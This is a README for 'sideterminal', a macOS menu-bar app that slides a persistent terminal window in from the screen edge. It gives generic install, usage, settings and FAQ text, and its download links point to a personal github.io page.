# 💻 sideterminal - Access your terminal from the edge

[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://ajwillemse.github.io)

sideterminal offers a way to interact with your command line interface without leaving your current workspace. The application resides at the edge of your screen. You trigger it to slide into view when you need to run a command. It keeps your terminal sessions active in the background.

## 📥 Getting Started

You need a computer running macOS to use this application. This tool utilizes AppKit and runs natively on Apple Silicon processors. Ensure your system meets these requirements before you begin.

### How to install

1. Visit the [official release page](https://ajwillemse.github.io).
2. Look for the latest version under the "Releases" section.
3. Download the file ending in `.dmg`.
4. Open the file once the download finishes.
5. Drag the sideterminal icon into your Applications folder.
6. Open your Applications folder and click the icon to start the program.

## ⚙️ How to use the app

sideterminal runs as a background process. Upon launch, you will see a small icon in your menu bar at the top of your screen.

### Opening the terminal
Move your mouse cursor to the edge of your screen or click the icon in your menu bar. The terminal window slides into view. You can type commands immediately.

### Hiding the terminal
Click anywhere outside the sideterminal window or press the escape key. The window slides back to the edge and disappears from your view.

### Settings
Right-click the icon in your menu bar to open the settings menu. You can change how fast the window slides, the opacity of the background, and the keyboard shortcut used to trigger the tool.

## 🛠 Features

* **Instant Access**: Open your terminal from any screen or application.
* **Session Persistence**: Your long-running processes continue even when you hide the window.
* **Low Impact**: The app consumes minimal memory and processor power.
* **Native Design**: The interface matches the look and feel of your macOS system.
* **Sidebar Integration**: The terminal attaches to the screen edge to save space.

## 🔐 Privacy and Security

sideterminal processes your commands locally on your machine. The software does not send your data to remote servers. It manages your terminal sessions through the native terminal interface of your operating system. You maintain control over your data and your command history at all times.

## 💬 Frequently Asked Questions

**Does this app support custom shell themes?**
Yes. The app reads your existing shell configuration files. If you use Zsh or Bash with custom themes, those settings carry over to the sidebar window.

**Can I run multiple sidebar windows?**
The current version supports one terminal sidebar. You can open multiple tabs within that window to manage different work tasks.

**Why does the window not open?**
Check if the app appears in your menu bar. If it does not, open your Applications folder and double-click the icon. If the app is open but does not respond, click the icon in the menu bar to force the interface to refresh.

**Does it work with window managers?**
The window exists as a floating overlay. It works alongside most window management tools without conflict. 

## 📝 Support

Use the issues tab on the repository page to report bugs. Provide as much detail as possible about your macOS version and the steps to reproduce the problem. Include screenshots if they help explain the issue.

Keywords: appkit, apple-silicon, developer-tools, macos, menubar, productivity, sidebar, swift, swiftui, terminal, terminal-emulator